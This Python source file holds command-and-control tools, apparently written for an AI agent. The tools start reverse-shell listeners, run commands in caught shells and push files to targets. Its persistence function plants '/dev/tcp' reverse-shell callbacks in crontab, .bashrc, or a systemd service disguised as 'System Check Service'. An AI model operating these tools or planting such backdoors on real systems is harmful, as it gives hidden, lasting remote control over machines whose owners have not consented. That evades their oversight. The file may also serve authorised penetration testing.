"""
C2 / Shell Session Management

Uses the existing tmux-backed interactive shell runtime so listener sessions,
interactive shells, and command execution all share one reliable transport.
"""

from __future__ import annotations

import base64
import asyncio
import shutil
import subprocess
import threading
import time
from datetime import datetime
from typing import Dict

from src.sdk.tmux_session import TmuxSessionManager
from src.sdk.tool import function_tool

# Session storage keyed by shell session id
ACTIVE_SESSIONS: Dict[str, dict] = {}
# Port -> session id lookup
LISTENER_PORTS: Dict[int, str] = {}


def _listener_session_name(port: int) -> str:
    return f"c2_listener_{port}"


def _get_manager(session_name: str) -> TmuxSessionManager:
    return TmuxSessionManager(session=session_name)


def _kill_tmux_session(session_name: str) -> None:
    subprocess.run(
        ["tmux", "kill-session", "-t", session_name],
        capture_output=True,
        text=True,
        timeout=10,
    )


def _build_listener_command(listener_type: str, port: int, interface: str) -> list[str]:
    if listener_type == "netcat":
        cmd = ["nc", "-lvnp", str(port)]
        if interface and interface != "0.0.0.0":
            cmd.extend(["-s", interface])
        return cmd
    if listener_type == "pwncat":
        cmd = ["pwncat-cs", "-l", "-p", str(port)]
        if interface and interface != "0.0.0.0":
            cmd.extend(["-H", interface])
        return cmd
    if listener_type == "socat":
        bind = f",bind={interface}" if interface and interface != "0.0.0.0" else ""
        return [
            "socat",
            f"TCP-LISTEN:{port},reuseaddr,fork{bind}",
            "EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
        ]
    raise ValueError(f"Unknown listener type: {listener_type}. Use: netcat, pwncat, socat")


def _refresh_session_state(session: dict) -> None:
    mgr = _get_manager(session["tmux_session"])
    try:
        screen = mgr.read_screen()
    except Exception as exc:
        session["status"] = "error"
        session["last_screen"] = f"[ERROR] {exc}"
        return

    session["last_screen"] = screen
    lowered = screen.lower()

    if session["status"] == "terminated":
        return

    if "command not found" in lowered or "critical error" in lowered:
        session["status"] = "error"
    elif any(marker in lowered for marker in ("connection from", "connect to", "meterpreter", "uid=", "whoami", "[running/prompt]")):
        if session["status"] == "listening":
            session["connected_at"] = datetime.now().isoformat()
        session["status"] = "active"
    elif "[idle]" in lowered and session["status"] == "listening":
        session["status"] = "listening"
    elif session["status"] not in {"active", "listening"}:
        session["status"] = "unknown"


def _record_command(session: dict, command: str, output: str) -> None:
    session["last_activity"] = datetime.now().isoformat()
    session["commands_executed"].append(
        {
            "command": command,
            "timestamp": session["last_activity"],
            "output": (output or "")[:1000],
        }
    )


@function_tool()
def start_listener(port: int = 4444, listener_type: str = "netcat", interface: str = "0.0.0.0") -> str:
    """
    Start a listener inside a persistent tmux-backed shell session.

    Args:
        port: Port to listen on
        listener_type: netcat, pwncat, or socat
        interface: Interface to bind to

    Returns:
        Listener status and the shell session id to monitor
    """
    if port in LISTENER_PORTS:
        existing = LISTENER_PORTS[port]
        return f"⚠️ Listener already registered on port {port} as session `{existing}`"

    if shutil.which("tmux") is None:
        return "❌ tmux is required for persistent shell listeners but is not installed."

    try:
        cmd = _build_listener_command(listener_type, port, interface)
    except ValueError as exc:
        return f"❌ {exc}"

    session_name = _listener_session_name(port)
    session_id = f"shell_{port}"
    mgr = _get_manager(session_name)

    try:
        # Ensure a clean session for this port
        _kill_tmux_session(session_name)
        mgr.initialize()
        launch_result = mgr.execute(" ".join(cmd), timeout=5)
    except Exception as exc:
        return f"❌ Failed to start listener: {exc}"

    ACTIVE_SESSIONS[session_id] = {
        "id": session_id,
        "port": port,
        "listener_type": listener_type,
        "interface": interface,
        "tmux_session": session_name,
        "created_at": datetime.now().isoformat(),
        "connected_at": "",
        "last_activity": datetime.now().isoformat(),
        "commands_executed": [],
        "status": "listening",
        "last_screen": launch_result,
    }
    LISTENER_PORTS[port] = session_id
    _refresh_session_state(ACTIVE_SESSIONS[session_id])

    return f"""✅ Listener started successfully

**Listener Details**
- Session ID: {session_id}
- Listener type: {listener_type}
- Port: {port}
- Interface: {interface}
- Tmux session: {session_name}
- Command: {' '.join(cmd)}

**How to use it**
- Monitor: `list_active_shells()`
- Interact after callback: `execute_in_shell("{session_id}", "whoami")`
- Read current pane: `get_session_history("{session_id}")`

**Launch Result**
{launch_result}
"""


@function_tool()
def list_active_shells() -> str:
    """
    List all known listener/shell sessions and their current state.
    """
    if not ACTIVE_SESSIONS:
        return "🔴 No active shell sessions.\n\nUse `start_listener(port)` to create one."

    lines = ["## Active Shell Sessions", ""]
    lines.append("| Session ID | Port | Type | Status | Connected At | Commands |")
    lines.append("|------------|------|------|--------|--------------|----------|")

    for session_id, session in ACTIVE_SESSIONS.items():
        _refresh_session_state(session)
        lines.append(
            f"| {session_id} | {session['port']} | {session['listener_type']} | "
            f"{session['status']} | {session.get('connected_at') or '-'} | {len(session['commands_executed'])} |"
        )

    lines.append("")
    lines.append("Use `execute_in_shell(session_id, command)` once a listener transitions to `active`.")
    return "\n".join(lines)


@function_tool()
def execute_in_shell(session_id: str, command: str, timeout: int = 20) -> str:
    """
    Execute a command inside a persistent tmux-backed listener shell.

    Args:
        session_id: Shell session id from `start_listener`
        command: Command or shell input to send
        timeout: Execution timeout in seconds
    """
    if session_id not in ACTIVE_SESSIONS:
        return f"❌ Session not found: {session_id}"

    session = ACTIVE_SESSIONS[session_id]
    mgr = _get_manager(session["tmux_session"])
    _refresh_session_state(session)

    try:
        output = mgr.execute(command, is_input=True, timeout=timeout)
    except Exception as exc:
        session["status"] = "error"
        return f"❌ Failed to execute command in shell: {exc}"

    session["status"] = "active"
    _record_command(session, command, output)

    return f"""**Command:** `{command}`
**Session:** {session_id}
**Status:** {session['status']}
**Output:**
```
{output.strip()}
```
"""


@function_tool()
def maintain_shell(session_id: str, keep_alive_interval: int = 30) -> str:
    """
    Keep a shell session warm with periodic low-noise heartbeats.
    """
    if session_id not in ACTIVE_SESSIONS:
        return f"❌ Session not found: {session_id}"

    def heartbeat() -> None:
        while session_id in ACTIVE_SESSIONS:
            session = ACTIVE_SESSIONS.get(session_id)
            if not session or session["status"] == "terminated":
                break
            try:
                asyncio.run(execute_in_shell(session_id, "echo alive", timeout=8))
            except Exception:
                session["status"] = "disconnected"
                break
            time.sleep(max(keep_alive_interval, 5))

    threading.Thread(target=heartbeat, daemon=True).start()
    return (
        f"✅ Shell maintenance enabled for {session_id}\n\n"
        f"- Heartbeat interval: {keep_alive_interval}s\n"
        f"- Heartbeat command: `echo alive`\n"
        f"- Transport: tmux-backed persistent shell session"
    )


@function_tool()
async def upload_file_to_shell(session_id: str, local_path: str, remote_path: str) -> str:
    """
    Upload a local file to the target through a shell session via base64.
    """
    if session_id not in ACTIVE_SESSIONS:
        return f"❌ Session not found: {session_id}"

    try:
        with open(local_path, "rb") as fh:
            blob = fh.read()
    except FileNotFoundError:
        return f"❌ Local file not found: {local_path}"
    except Exception as exc:
        return f"❌ Failed to read local file: {exc}"

    encoded = base64.b64encode(blob).decode()
    upload_cmd = f"echo '{encoded}' | base64 -d > {remote_path}"
    write_result = await execute_in_shell(session_id, upload_cmd, timeout=30)
    verify_result = await execute_in_shell(session_id, f"ls -lh {remote_path}", timeout=15)

    return f"""✅ File upload attempted

**Local:** {local_path}
**Remote:** {remote_path}
**Size:** {len(blob)} bytes

**Write Result**
{write_result}

**Verification**
{verify_result}
"""


@function_tool()
async def establish_persistence(session_id: str, method: str = "cron") -> str:
    """
    Attempt persistence setup using a shell session.
    """
    if session_id not in ACTIVE_SESSIONS:
        return f"❌ Session not found: {session_id}"

    session = ACTIVE_SESSIONS[session_id]
    port = session["port"]

    if method == "cron":
        cmd = (
            f"(crontab -l 2>/dev/null; "
            f"echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/{port} 0>&1\"') | crontab -"
        )
        result = await execute_in_shell(session_id, cmd, timeout=30)
        return f"✅ Cron persistence attempted\n\n{result}"

    if method == "bashrc":
        cmd = f"echo 'bash -i >& /dev/tcp/YOUR_IP/{port} 0>&1 &' >> ~/.bashrc"
        result = await execute_in_shell(session_id, cmd, timeout=20)
        return f"✅ .bashrc persistence attempted\n\n{result}"

    if method == "systemd":
        service = (
            "[Unit]\n"
            "Description=System Check Service\n"
            "After=network.target\n\n"
            "[Service]\n"
            f"ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/{port} 0>&1'\n"
            "Restart=always\n\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n"
        )
        write_cmd = f"cat > /tmp/syscheck.service <<'EOF'\n{service}EOF"
        result1 = await execute_in_shell(session_id, write_cmd, timeout=20)
        result2 = await execute_in_shell(
            session_id,
            "sudo mv /tmp/syscheck.service /etc/systemd/system/syscheck.service && "
            "sudo systemctl enable syscheck.service && sudo systemctl restart syscheck.service",
            timeout=30,
        )
        return f"✅ systemd persistence attempted\n\n{result1}\n\n{result2}"

    return f"❌ Unknown persistence method: {method}. Use: cron, bashrc, systemd"


@function_tool()
def kill_session(session_id: str) -> str:
    """
    Terminate a tmux-backed shell session and remove it from the registry.
    """
    if session_id not in ACTIVE_SESSIONS:
        return f"❌ Session not found: {session_id}"

    session = ACTIVE_SESSIONS[session_id]
    try:
        _kill_tmux_session(session["tmux_session"])
    except Exception:
        pass

    LISTENER_PORTS.pop(session["port"], None)
    session["status"] = "terminated"
    del ACTIVE_SESSIONS[session_id]
    return f"✅ Session {session_id} terminated successfully"


@function_tool()
async def stop_listener(port: int) -> str:
    """
    Stop the listener registered on a given port.
    """
    session_id = LISTENER_PORTS.get(port)
    if not session_id:
        return f"❌ No listener found on port {port}"
    return await kill_session(session_id)


@function_tool()
def get_session_history(session_id: str) -> str:
    """
    Show command history and the latest screen snapshot for a shell session.
    """
    if session_id not in ACTIVE_SESSIONS:
        return f"❌ Session not found: {session_id}"

    session = ACTIVE_SESSIONS[session_id]
    _refresh_session_state(session)

    lines = [f"## Command History: {session_id}", ""]
    lines.append(f"- Status: {session['status']}")
    lines.append(f"- Port: {session['port']}")
    lines.append(f"- Last activity: {session['last_activity']}")
    lines.append("")

    if session["commands_executed"]:
        for idx, entry in enumerate(session["commands_executed"], 1):
            lines.append(f"### Command {idx}")
            lines.append(f"**Timestamp:** {entry['timestamp']}")
            lines.append(f"**Command:** `{entry['command']}`")
            lines.append(f"```text\n{entry['output'][:400]}\n```")
            lines.append("")
    else:
        lines.append("No commands executed yet.")
        lines.append("")

    lines.append("### Current Screen")
    lines.append(f"```text\n{session.get('last_screen', '')[:2000]}\n```")
    return "\n".join(lines)
